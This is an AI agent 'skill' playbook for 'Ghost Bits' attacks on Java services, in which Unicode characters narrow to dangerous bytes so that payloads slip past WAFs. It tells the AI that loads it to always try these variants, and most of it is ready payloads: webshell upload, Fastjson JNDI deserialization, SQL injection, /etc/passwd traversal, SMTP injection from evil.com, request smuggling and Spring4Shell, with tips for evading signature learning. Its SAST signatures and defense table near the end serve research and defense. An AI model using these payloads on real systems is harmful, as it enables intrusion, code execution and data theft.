---
name: ghost-bits-cast-attack
description: >-
  Java "Ghost Bits" / Cast Attack playbook (Black Hat Asia 2026). Use when
  attacking Java services where 16-bit char is silently narrowed to 8-bit byte
  to bypass WAF/IDS for SQL injection, deserialization RCE, file upload
  (Webshell), path traversal, CRLF injection, request smuggling, and SMTP
  injection. Affects Tomcat, Spring, Jetty, Undertow, Vert.x, Jackson,
  Fastjson, Apache Commons BCEL, Apache HttpClient, Angus Mail, JDK
  HttpServer, Lettuce, Jodd, XMLWriter and re-enables many "patched" CVEs
  through WAF bypass.
---

# SKILL: Ghost Bits / Cast Attack — Java char to byte Narrowing Playbook

> **AI LOAD INSTRUCTION**: This is a Java-only injection-enabling primitive,
> not a standalone vulnerability class. Whenever you see (1) a Java backend,
> (2) a WAF/IDS in front of it, and (3) any of {SQLi, deser RCE, file upload,
> path traversal, CRLF, request smuggling, SMTP injection} on the menu, ALWAYS
> try Ghost Bits variants of the payload before declaring it "blocked". The
> root cause is the silent loss of the high 8 bits when Java code narrows a
> 16-bit `char` to an 8-bit `byte`.
>
> Source: Black Hat Asia 2026 talk *Cast Attack: A New Threat Posed by Ghost
> Bits in Java* by Xinyu Bai (@b1u3r), Zhihui Chen (@1ue).

## 0. RELATED ROUTING

- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — first technique to try beyond classic encoding
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — BCEL ClassLoader and Fastjson variants
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — Spring, Jetty, Undertow, Vert.x URL decoding
- [upload-insecure-files](../upload-insecure-files/SKILL.md) — Tomcat `RFC2231Utility` `filename*` Webshell upload
- [request-smuggling](../request-smuggling/SKILL.md) — Apache HttpClient header CRLF
- [crlf-injection](../crlf-injection/SKILL.md) — Angus Mail / Jakarta Mail SMTP injection
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) — Jackson `charToHex` table-lookup truncation

### Advanced Reference

Load [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md) for:
- Full byte-to-Ghost-character lookup table (every printable ASCII byte 0x20-0x7E)
- Per-component affected version matrix and patch identifiers
- Python and Yaklang one-liner payload generators
- Blue-team WAF detection pseudocode

---

## 1. ONE-MINUTE MENTAL MODEL

Java's `char` is a **16-bit** unsigned integer. Wire protocols are **8-bit** byte oriented. Correct bridging:

```java
// Correct: explicit UTF-8
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

Legacy code silently narrows:

```java
// Dangerous: high 8 bits silently dropped
byte b = (byte) ch;          // 0x966A -> 0x6A
out.write(ch);               // ByteArrayOutputStream.write(int) keeps low 8 bits
dos.writeBytes(str);         // DataOutputStream loops char->byte cast
int v = ch & 0xFF;           // explicit low-byte mask
```

```
View A (string layer: WAF / business validation / logs)
  sees: 降 阮 严 灵 瘍 瘊 ...   "harmless Unicode garbage, allow"
                  |
                  v       silent narrowing somewhere in the call stack
View B (byte layer: protocol / file system / parser / class loader)
  sees: j  .  %  u  \r \n ...  "executes the dangerous semantics"
```

Mathematical formulation: to make View B see byte `T`, pick any `k in 0x01..0xFF` and use:

```
c = chr((k << 8) | T)
```

That gives you **255 candidate Unicode characters per dangerous byte**.

---

## 2. THREE ROOT-CAUSE FAMILIES

### Family A — Real high-bit truncation (classic Ghost Bits)

```java
byte b = (byte) ch;                           // Pattern A1: explicit cast
int v = ch & 0xFF;                            // Pattern A2: bitwise mask
out.write(ch);                                // Pattern A3: OutputStream.write(int)
dos.writeBytes(str);                          // Pattern A4: DataOutputStream
String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin); // Pattern A5: deprecated
```

Impact: Tomcat `filename*`, BCEL ClassLoader, Lettuce Redis, Angus Mail CRLF, HttpClient injection.

### Family B — Bit-arithmetic folding (illegal char becomes legal)

```java
// Jetty TypeUtil.fromHexDigit (simplified)
private static int fromHexDigit(char c) {
    int x = c & 0x1F;          // keep low 5 bits
    x += (c >> 6) * 25;
    x -= 16;
    return x;                  // no range check
}
```

Example: `>` (0x3E) -> `0x3E & 0x1F = 30; 30 + 0 - 16 = 14 = 0xE` -> `%2>` parsed as `%2E` = `.`

Impact: Openfire CVE-2023-32315, GeoServer CVE-2024-36401.

### Family C — Lax Unicode normalization

```java
Character.digit(c, 16);    // Fastjson: accepts Thai, Punjabi, fullwidth digits
return sHexValues[ch & 0xff]; // Jackson: index by low 8 bits
```

Impact: Fastjson `\u`/`\x` escape bypass, fullwidth URL path traversal.

---

## 3. CHARACTER GENERATOR

```python
def ghost(target_byte: int, k: int = 1) -> str:
    """Return a Unicode char whose low 8 bits equal target_byte."""
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))

# 255 candidates per byte, e.g. for '.' (0x2E):
candidates = [ghost(0x2E, k) for k in range(1, 256)]
```

Selection guidance:
- Avoid surrogate range `0xD800..0xDFFF` (k in 0xD8..0xDF)
- Prefer Latin-Extended, CJK Unified Ideographs, Hangul
- Rotate `k` between requests to evade signature learning

---

## 4. DANGEROUS-BYTE TO GHOST-CHARACTER MAP

| Target byte | Hex  | Used for                              | Ghost char | Code point |
|-------------|------|---------------------------------------|------------|------------|
| `\t`        | 0x09 | header folding, parser confusion      | `ĉ`        | U+0109     |
| `\n`        | 0x0A | CRLF injection, log injection         | `瘊`       | U+760A     |
| `\r`        | 0x0D | CRLF injection, request smuggling     | `瘍`       | U+760D     |
| ` `         | 0x20 | header break, command separator       | `Ġ`        | U+0120     |
| `"`         | 0x22 | string break in JSON                  | `Ģ`        | U+0122     |
| `%`         | 0x25 | URL encoding prefix                   | `严`       | U+4E25     |
| `&`         | 0x26 | parameter separator                   | `Ȧ`        | U+0226     |
| `'`         | 0x27 | SQL string break                      | `ȧ`        | U+0227     |
| `(`         | 0x28 | EL/SpEL/OGNL syntax                   | `Ȩ`        | U+0228     |
| `)`         | 0x29 | EL/SpEL/OGNL syntax                   | `ȩ`        | U+0229     |
| `.`         | 0x2E | path traversal, extension             | `阮`       | U+962E     |
| `/`         | 0x2F | path separator                        | `丯`       | U+4E2F     |
| `;`         | 0x3B | command separator                     | `Ȼ`       | U+023B     |
| `<`         | 0x3C | XSS / XML tag start                   | `ȼ`        | U+023C     |
| `>`         | 0x3E | XSS / XML tag end                     | `Ⱦ`        | U+023E     |
| `@`         | 0x40 | Fastjson `@type`, mail address        | `ŀ`        | U+0140     |
| `j`         | 0x6A | extension `.jsp`                      | `陪`       | U+966A     |
| `n`         | 0x6E | keyword `Runtime`, `union`            | `陮`       | U+966E     |
| `s`         | 0x73 | keyword `class`, `select`             | `⑳`        | U+2473     |
| `u`         | 0x75 | `\u` escape introducer                | `灵`       | U+7075     |

---

## 5. PER-COMPONENT PAYLOAD RECIPES

### 5.1 Tomcat RFC2231Utility — file upload Webshell (Family A)

```
Content-Disposition: attachment; filename*=UTF-8''1.陪sp
```

| Stage | Filename |
|---|---|
| WAF / extension filter | `1.陪sp` (not `.jsp`, allow) |
| Tomcat RFC2231 decoder | `陪` -> low byte 0x6A -> `j` |
| File system | `1.jsp` |

### 5.2 Apache Commons BCEL — ClassLoader RCE (Family A)

Wrap each byte of malicious BCEL bytecode into a Unicode character whose low 8 bits equal that byte. WAF sees CJK text without `$$BCEL$$` keywords; BCEL decodes to valid class bytes.

### 5.3 Jackson charToHex — SQLi smuggling (Family C)

```json
{"q": "\u丰丰耳失 union select 1,2,3 -- "}
```

| View    | Content |
|---|---|
| WAF     | `\u丰丰耳失 union select ...` (no leading digit) |
| Jackson | `1 union select 1,2,3-- ` -> `1 union select…` |

### 5.4 Fastjson — @type smuggling (Families B + C)

```json
{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

`\x4_` -> `'4'(=4) * 16 + '_'(=0) = 0x40 = '@'`

### 5.5 Spring / Jetty — URL decoding (Families A + B)

```
/api/v1/data?file=阮丯阮丯etc丯passwd
                = ../../etc/passwd at the byte layer

/setup/setup-s/%2>%2>/log.jsp
                = /setup/setup-s/../../log.jsp after Jetty decode
```

Spring CVE-2025-41242 chain:

```
input :  阮严灵丰丰甲来
       (.)(%)(u)(0)(0)(2)(e)
narrow:  .%u002e
decode:  ..
result:  path traversal
```

### 5.6 Angus Mail / Jakarta Mail — SMTP injection (Family A)

```
hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
```

### 5.7 Apache HttpClient <= 4.5.9 — request smuggling (Family A)

```
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
```

### 5.8 JDK HttpServer — response splitting (CVE-2026-21933, Family A)

```
Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

---

## 6. KNOWN-CVE BYPASS RECIPES

### Openfire CVE-2023-32315 (Family B)

```
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
```

### GeoServer CVE-2024-36401 (Family B)

```
Ru%6>time       -> Runtime
```

### Spring4Shell CVE-2022-22965 (Family A)

```
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader.resources..."
```

| Char | Code point | Low byte |
|---|---|---|
| `c` | U+3E63 | 0x63 |
| `l` | U+0C6C | 0x6C |
| `a` | U+1661 | 0x61 |
| `s` | U+2473 | 0x73 |
| `s` | U+2473 | 0x73 |

---

## 7. DETECTION DECISION TREE

```
Is the backend Java?
├── No  -> stop, Ghost Bits does not apply
└── Yes
    ├── Is there a WAF / IDS blocking your literal payload?
    │   ├── No  -> use literal payload; Ghost Bits is overkill
    │   └── Yes -> continue
    ├── Which sink are you targeting?
    │   ├── File upload via multipart  -> recipe 5.1 (Tomcat filename*)
    │   ├── JSON deserialization       -> recipes 5.3 (Jackson) / 5.4 (Fastjson)
    │   ├── Class loader / BCEL ref    -> recipe 5.2
    │   ├── URL path / parameter       -> recipe 5.5 + Family B %2>
    │   ├── Header reflection          -> recipes 5.7 / 5.8
    │   ├── Mail send                  -> recipe 5.6
    │   └── Redis / RESP / XML / RPC   -> recipe 5.9
    └── Probe with single non-destructive substitution first
        (replace ONE character with its Ghost variant; observe response diff)
```

---

## 8. SAST / CODE-AUDIT SIGNATURES

### Tier 1 — direct narrowing (Family A)

```
\(byte\)\s*\w+
&\s*0[xX][fF][fF]
&\s*255
\.write\(\s*[a-zA-Z_]\w*\s*\)
writeBytes\s*\(
StringBufferInputStream
```

### Tier 2 — lax hex / digit decoding (Families B + C)

```
Character\.digit\s*\(
fromHexDigit
charToHex
uriDecode
sHexValues\[
```

---

## 9. DEFENSE AWARENESS

| Layer | Action |
|---|---|
| Source code | Ban `(byte) ch`, `& 0xFF`, `out.write(ch)`, `writeBytes`. Use `getBytes(StandardCharsets.UTF_8)`. |
| Decoder | Reject illegal input. Never default-fold unknown hex/Unicode digit to 0 or low 8 bits. |
| Validation order | Normalize first, then validate: decode -> Unicode NFC/NFKC -> protocol normalize -> security check -> execute. |
| Protocol field | Strict allowlists per field. Reject CR/LF in any header or address. |
| WAF / IDS | Run multi-view normalizer: inspect original AND `(char) & 0xFF` view AND URL-decoded view AND Unicode-NFKC view. |

---

## 10. QUICK REFERENCE

```text
# Ghost char generator
ghost(T, k) = chr(((k & 0xFF) << 8) | (T & 0xFF))     # avoid k in 0xD8..0xDF

# Tomcat filename* webshell upload
Content-Disposition: attachment; filename*="UTF-8''shell.陪sp"     # -> shell.jsp

# Jackson SQLi smuggling
{"q":"\u丰丰耳失 union select 1,2,3-- "}                          # -> "1 union select..."

# Fastjson @type smuggling
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}

# Spring URL decode bypass
GET /api/data?file=阮丯阮丯etc丯passwd
GET /setup/setup-s/%2>%2>/log.jsp

# Spring4Shell name* class smuggling
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader..."

# Angus Mail SMTP hijack
From: hacker@evil.com瘍瘊Subject: Reset瘍瘊To: victim@org.com瘍瘊瘍瘊Your code is 1234

# Apache HttpClient <=4.5.9 smuggling
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal

# SAST first-pass grep
grep -RnE '\(byte\)\s*\w+|& 0[xX][fF][fF]|writeBytes|baos\.write\(\w+\)' src/
```

---

## REFERENCES

- Black Hat Asia 2026 — *Cast Attack: A New Threat Posed by Ghost Bits in Java*. Xinyu Bai (@b1u3r), Zhihui Chen (@1ue). Contributor: Zongzheng Zheng (@chun_springX).
- CVEs: GeoServer CVE-2024-36401, Spring4Shell CVE-2022-22965, Openfire CVE-2023-32315, Spring CVE-2025-41242, Jakarta Mail CVE-2025-57733, JDK HttpServer CVE-2026-21933, Apache HttpClient HTTPCLIENT-1974/1978.
